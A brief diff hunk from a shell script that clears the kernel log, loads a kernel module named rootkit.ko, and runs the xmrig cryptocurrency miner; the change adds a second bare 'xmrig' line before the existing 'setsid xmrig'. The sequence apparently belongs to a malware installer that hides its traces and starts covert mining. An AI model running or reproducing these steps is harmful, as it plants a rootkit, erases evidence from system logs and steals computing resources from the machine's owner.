@@ -26,6 +26,7 @@ dmesg -C
 insmod rootkit.ko
 dmesg 
 echo "done loading module"
+xmrig 
 
 setsid xmrig 
 
